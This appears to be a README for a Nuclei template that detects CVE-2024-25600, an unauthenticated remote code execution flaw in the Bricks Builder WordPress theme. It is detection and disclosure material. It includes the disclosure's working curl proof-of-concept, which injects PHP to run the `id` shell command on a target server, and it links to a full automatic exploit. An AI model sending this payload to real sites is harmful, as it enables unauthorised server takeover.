# CVE-2024-25600_Nuclei-Template
Nuclei template and information about the POC for CVE-2024-25600

## Description 📝

The Bricks theme for WordPress is vulnerable to Remote Code Execution in all versions up to, and including, 1.9.6. This makes it possible for unauthenticated attackers to execute code on the server.
This template 🛠️ is designed to detect the CVE-2024-25600 vulnerability 🕳️ found in the Bricks Builder plugin for WordPress using nuclei. The vulnerability allows for unauthenticated remote code execution on affected websites 💻.

## Proof of Concept (PoC) 📝

The Complete POC (automatic) is avaible at [https://github.com/chocapikk/CVE-2024-25600](https://github.com/chocapikk/CVE-2024-25600).

The base PoC provided by the disclosure is as follows:

```bash
curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
-H "Content-Type: application/json" \
-d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
        "objectType": "post"
      }
    }
  }
}'
```

Replace `[HOST]` with the target website and `[NONCE]` with the nonce value retrieved from the site.

## Reference 📖

For more information about the CVE-2024-25600 vulnerability, please refer to the detailed disclosure at [Snicco.io](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6).
